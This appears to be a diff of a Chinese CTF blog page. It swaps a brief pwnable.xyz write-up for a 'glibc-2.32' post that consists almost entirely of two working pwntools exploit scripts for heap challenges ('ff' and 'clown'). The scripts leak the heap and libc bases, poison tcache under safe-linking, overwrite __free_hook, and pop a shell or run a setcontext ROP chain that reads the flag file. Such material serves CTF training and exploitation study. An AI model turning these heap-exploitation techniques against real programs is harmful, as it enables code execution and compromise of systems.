@@ -3,7 +3,7 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
   
-  <title>pwnable.xyz misalignment WriteUp - 广莫之野</title>
+  <title>glibc-2.32 - 广莫之野</title>
   <meta charset="UTF-8">
   <meta name="description" content>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -11,21 +11,18 @@
   
 
   <link rel="shortcut icon" href="/home.png" type="image/png">
-  <meta name="description" content="pwnable.xyz 上的misalignment的WriteUp。">
+  <meta name="description" content="2.32tcache和fastbin在放入时会加入一个异或加密.">
 <meta name="keywords" content="ctf,pwn">
 <meta property="og:type" content="article">
-<meta property="og:title" content="pwnable.xyz misalignment WriteUp">
-<meta property="og:url" content="http://shiroinu.top/2019/09/12/misaligment/index.html">
+<meta property="og:title" content="glibc-2.32">
+<meta property="og:url" content="http://shiroinu.top/2021/04/16/glibc-2-32/index.html">
 <meta property="og:site_name" content="广莫之野">
-<meta property="og:description" content="pwnable.xyz 上的misalignment的WriteUp。">
+<meta property="og:description" content="2.32tcache和fastbin在放入时会加入一个异或加密.">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://i.loli.net/2019/09/12/N7duFq2lIhxyGz8.png">
-<meta property="og:image" content="https://i.loli.net/2019/09/12/6mIfwGd7FOVAqYx.png">
-<meta property="og:updated_time" content="2019-09-12T11:25:22.167Z">
+<meta property="og:updated_time" content="2021-04-17T01:34:04.047Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwnable.xyz misalignment WriteUp">
-<meta name="twitter:description" content="pwnable.xyz 上的misalignment的WriteUp。">
-<meta name="twitter:image" content="https://i.loli.net/2019/09/12/N7duFq2lIhxyGz8.png">
+<meta name="twitter:title" content="glibc-2.32">
+<meta name="twitter:description" content="2.32tcache和fastbin在放入时会加入一个异或加密.">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdui@0.4.3/dist/css/mdui.min.css">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.15.8/styles/atom-one-dark.css">
    
@@ -33,7 +30,7 @@
   
   
   <link rel="stylesheet" href="//at.alicdn.com/t/font_1038733_0xvrvpg9c0r.css">
-  <link rel="stylesheet" href="/css/style.css?v=1618623339397">
+  <link rel="stylesheet" href="/css/style.css?v=1618623339219">
 </head>
 
 <body class="mdui-drawer-body-left">
@@ -134,43 +131,202 @@
         
             <img src="/images/back1.png">
         
-        <h1>pwnable.xyz misalignment WriteUp</h1>
+        <h1>glibc-2.32</h1>
     </div>
   <div class="nexmoe-post-meta">
-    <a><i class="nexmoefont icon-calendar-fill"></i>2019年09月12日</a>
-    <a><i class="nexmoefont icon-areachart"></i>219 字</a>
-    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 1 分钟</a>
+    <a><i class="nexmoefont icon-calendar-fill"></i>2021年04月16日</a>
+    <a><i class="nexmoefont icon-areachart"></i>1k 字</a>
+    <a><i class="nexmoefont icon-time-circle-fill"></i>大概 6 分钟</a>
     
     
       <a class="nexmoefont icon-tag-fill -link" href="/tags/ctf/">ctf</a> <a class="nexmoefont icon-tag-fill -link" href="/tags/pwn/">pwn</a>
     
   </div>
   <article>
-    <p>pwnable.xyz 上的misalignment的WriteUp。</p>
+    <p>2.32tcache和fastbin在放入时会加入一个异或加密.</p>
 <a id="more"></a>
-
-<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><p><img src="https://i.loli.net/2019/09/12/N7duFq2lIhxyGz8.png" alt="MarkDown"></p>
-<p>目标很明确，使v5+7 == 0xB000000B5即可获得flag。</p>
-<p><em>注意</em></p>
-<ol>
-<li><p>v6/v7/v8 是int64，占8字节，因此通过每次输入v8只能控制 <code>v5 - v5+7</code>  ,<code>v5+8 - v5+15</code>这两个范围的内容中的一个，因此需要分两次输入。</p>
-</li>
-<li><p>因为是小端序，因此从v5 + 7一直到 v5 + 14 中的值应该按次序为0xB5,0x00,0x00,0x00,0x0B,0x00,0x00,0x00.</p>
-</li>
-</ol>
-<p>由此可得，第一次v8 = -6时，v6+v7应该 = 0xB500000000000000 特别地，因为刚好8字节，符号位又为1，因此输入的值应该为<code>-5404319552844595200</code>（从计算器中可得）</p>
-<p><img src="https://i.loli.net/2019/09/12/6mIfwGd7FOVAqYx.png" alt="MarkDown"></p>
-<p>同理，第二次v8 = -5 ，输入的值就是0x0B000000 = 184549376</p>
-<p>运行脚本即可得flag。</p>
+<h1 id="vnctf-ff"><a href="#vnctf-ff" class="headerlink" title="vnctf-ff"></a>vnctf-ff</h1><p>2.32主要在于第一个放进tcache的块可以泄露堆基址,从而可以选择打tcache struct来任意地址malloc</p>
 <h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *
-context.log_level = &#39;DEBUG&#39;
-#sh = process(&#39;./challenge&#39;)
-sh = remote(&#39;svc.pwnable.xyz&#39;,30003)
-#sh.recv()
-#gdb.attach(sh)
+context.log_level = &quot;debug&quot;
+context.terminal = [&#39;tmux&#39;,&#39;sp&#39;,&#39;-h&#39;]
+sh = process(&#39;./ff&#39;)
+libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+def add(size,content):
+    sh.sendline(&#39;1&#39;)
+    sh.recvuntil(&#39;Size:\n&#39;)
+    sh.sendline(str(size))
+    sh.recvuntil(&#39;Content:\n&#39;)
+    sh.sendline(content)
+    sh.recvuntil(&#39;&gt;&gt;&#39;)
+def add_n(size,content):
+    sh.sendline(&#39;1&#39;)
+    sh.recvuntil(&#39;Size:\n&#39;,timeout=0.5)
+    sh.sendline(str(size))
+    sh.recvuntil(&#39;Content:\n&#39;,timeout=0.5)
+    sh.send(content)
+    sh.recvuntil(&#39;&gt;&gt;&#39;)
+def delete():
+    sh.sendline(&#39;2&#39;)
+    sh.recvuntil(&#39;&gt;&gt;&#39;,timeout=0.5)
+def show():
+    sh.sendline(&#39;3&#39;)
+    data = sh.recvuntil(&#39;1.add&#39;,drop=True)
+    sh.recvuntil(&#39;&gt;&gt;&#39;)
+    return data
+def edit(content):
+    sh.sendline(&quot;5&quot;)
+    sh.recvuntil(&#39;Content:\n&#39;)
+    sh.sendline(content)
+    sh.recvuntil(&#39;&gt;&gt;&#39;)
+add(0x78,&#39;a&#39;)
+delete()
+key = u64(show().ljust(8,b&#39;\x00&#39;))
+log.info(&quot;key = &quot;)
+log.info(hex(key))
 
-sh.sendline(&#39;-5404319552844595200 0 -6&#39;)
-sh.sendline(&#39;184549376 0 -5&#39;)
+heap_base = key &lt;&lt; 12
+log.success(hex(heap_base))
+edit(p64(0) * 2)
+delete()
+edit(p64(key ^ (heap_base + 0x10)) + p64(0))
+
+
+add(0x78,&#39;a&#39;)
+payload = p64(0) * 9 + p64(0x0007000000000000) + p64(0) * 5
+add(0x78,payload)
+delete()
+payload = p64(0x0000000100010001) + p64(0x0000000000010001)
+add(0x48,payload)
+add(0x48,p64(0) * 6 + p64(heap_base + 0xb0) + p64(0) + p64(heap_base + 0x90))
+
+sh.sendline(&#39;1&#39;)
+sh.recvuntil(&#39;Size:\n&#39;)
+sh.sendline(str(0x18))
+sh.recvuntil(&#39;Content:\n&#39;)
+sh.send(&#39;\xc0\xa6&#39;)
+sh.recvuntil(&#39;&gt;&gt;&#39;)
+payload = p64(0xfbad1800) + p64(0) * 3 + b&#39;\x00&#39; 
+# add_n(0x58,payload)
+
+sh.sendline(&#39;1&#39;)
+sh.recvuntil(&#39;Size:\n&#39;)
+sh.sendline(str(0x58))
+sh.recvuntil(&#39;Content:\n&#39;)
+sh.send(payload)
+libc_base = u64(sh.recv(6).ljust(8,b&#39;\x00&#39;)) - 0x1E4744
+log.success(&#39;libc_base = &#39; + hex(libc_base)) 
+free_hook = libc_base + libc.symbols[&#39;__free_hook&#39;]
+system = libc_base + libc.symbols[&#39;system&#39;]
+sh.recvuntil(&#39;&gt;&gt;&#39;)
+payload = p64(0) + p64(heap_base + 0x60) + p64(0) * 2 + p64(free_hook)*2
+add_n(0x38,payload)
+add_n(0x68,p64(system))
+add_n(0x28,&#39;/bin/sh\x00&#39;)
+# gdb.attach(sh)
+delete()
+sh.interactive()</code></pre>
+<h1 id="DASCTF2021-MAR-clown"><a href="#DASCTF2021-MAR-clown" class="headerlink" title="DASCTF2021 MAR clown"></a>DASCTF2021 MAR clown</h1><h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><pre><code class="python">from pwn import *
+context.log_level = &quot;debug&quot;
+context.terminal = [&#39;tmux&#39;,&#39;sp&#39;,&#39;-h&#39;]
+context.arch = &#39;amd64&#39;
+sh = process(&#39;./clown&#39;)
+libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)
+def add(size,content):
+    sh.sendline(&#39;1&#39;)
+    sh.recvuntil(&#39;Size: \n&#39;)
+    sh.sendline(str(size))
+    sh.recvuntil(&#39;Content: \n&#39;)
+    sh.sendline(content)
+    sh.recvuntil(&#39;&gt;&gt;&#39;)
+def add_n(size,content):
+    sh.sendline(&#39;1&#39;)
+    sh.recvuntil(&#39;Size: \n&#39;)
+    sh.sendline(str(size))
+    sh.recvuntil(&#39;Content: \n&#39;)
+    sh.send(content)
+    sh.recvuntil(&#39;&gt;&gt;&#39;)
+def delete(idx):
+    sh.sendline(&#39;2&#39;)
+    sh.recvuntil(&quot;Index: \n&quot;)
+    sh.sendline(str(idx))
+    sh.recvuntil(&#39;&gt;&gt;&#39;,timeout=0.5)
+def show(idx):
+    sh.sendline(&#39;3&#39;)
+    sh.recvuntil(&quot;Index: \n&quot;)
+    sh.sendline(str(idx))
+    # data = sh.recv(6)
+    data = sh.recvuntil(&#39;\nDone&#39;,drop=True)
+    sh.recvuntil(&#39;&gt;&gt;&#39;,timeout=0.5)
+    return data
+add(0x40,&#39;a&#39;) #0
+for i in range(9):
+    add(0x90,&#39;a&#39;) #1-9
+# for i in range(8):
+#     delete(i)
+delete(0)
+for i in range(8):
+    delete(i+1)
+key = u64(show(0).ljust(8,b&#39;\x00&#39;)) 
+heap_base = key &lt;&lt; 12
+log.info(&quot;heap_base = &quot; + hex(heap_base))
+add(0x78,&#39;&#39;) #10
+libc_base = u64(show(8).ljust(8,b&#39;\x00&#39;)) - 0x1E3C0a
+log.success(&quot;libc_base = &quot; + hex(libc_base))
+libc.address = libc_base
+for i in range(10):
+    add(0x40,&#39;a&#39;) #11 - 20
+for i in range(7):
+    delete(i + 11)
+delete(18) #21
+delete(19) #22
+delete(18) #23
+for i in range(7):
+    add(0x40,&#39;a&#39;) # 30
+add(0x40,p64((heap_base + 0xf0 ) ^ key)) #
+add(0x40,&#39;a&#39;) #
+add(0xe0,&#39;a&#39;) #31
+add(0xf0,&#39;a&#39;) #32
+add(0xc0,&#39;a&#39;) #33
+delete(31)
+delete(30)
+add(0x40,&#39;a&#39;) #33
+free_hook = libc.sym[&#39;__free_hook&#39;]
+add_n(0x40,p64(0) + p64(free_hook + 0xf0) + p64(free_hook))
+rdx_gadget = libc_base + 0x000000000014b760
+setcontext = libc.symbols[&#39;setcontext&#39;] + 61
+frame_addr = free_hook + 0x10 # rdx = [rdi +8]
+ret = libc_base + 0x0000000000026699
+frame = SigreturnFrame()
+frame.rax = 0
+frame.rsp = frame_addr + 0x118 #rop_addr
+
+frame.rip = ret #
+
+flag_addr = frame_addr + 0x100
+rdi_ret = libc_base + 0x000000000002858f
+rsi_ret = libc_base + 0x000000000002ac3f
+rdx_r12_ret = libc_base + 0x0000000000114161
+rop = p64(rdi_ret) + p64(flag_addr) + p64(rsi_ret) + p64(0) + p64(libc.symbols[&#39;open&#39;]) 
+rop += p64(rdi_ret) + p64(3) + p64(rsi_ret) + p64(frame_addr + 0x200) + p64(rdx_r12_ret) + p64(0x40) + p64(0) + p64(libc.symbols[&#39;read&#39;])
+rop += p64(rdi_ret) + p64(1) + p64(rsi_ret) + p64(frame_addr + 0x200) + p64(rdx_r12_ret) + p64(0x40) + p64(0) + p64(libc.symbols[&#39;write&#39;])
+
+#0x000000000014b760: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20]; 
+
+
+payload = p64(rdx_gadget) + p64(free_hook + 0x10) + p64(0)*4 + p64(setcontext) + (bytes(frame)[0x28:])+ b&#39;./flag&#39;.ljust(0x10,b&#39;\x00&#39;) + p64(0) + rop
+
+# free_hook -&gt; rdx_gadget  free -&gt; rdi = &amp;free_hook ; rdi+8 = &amp; p64(free_hook + 0x10)  ; rdx + 0x20 = setcontext + 61 , frame = rdx = free_hook + 0x10
+# setcontext -&gt; rsp = rop addr ; rip = ret ;
+log.info(hex(len(payload)))
+add(0xf0,payload[:0xe8]) #35
+
+add(0xe0,payload[0xe8:]) #36
+
+
+# gdb.attach(sh)
+sh.sendline(&#39;2&#39;)
+sh.recvuntil(&#39;Index: &#39;)
+sh.sendline(&#39;35&#39;)
 sh.interactive()</code></pre>
 
   </article>
@@ -210,7 +366,7 @@ sh.interactive()</code></pre>
 <script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.8/build/highlight.min.js"></script>
 <script>hljs.initHighlightingOnLoad();</script>
 
-<script src="/js/app.js?v=1618623339404"></script>
+<script src="/js/app.js?v=1618623339229"></script>
 <script src="https://cdn.jsdelivr.net/npm/lazysizes@5.1.0/lazysizes.min.js"></script>
 
 
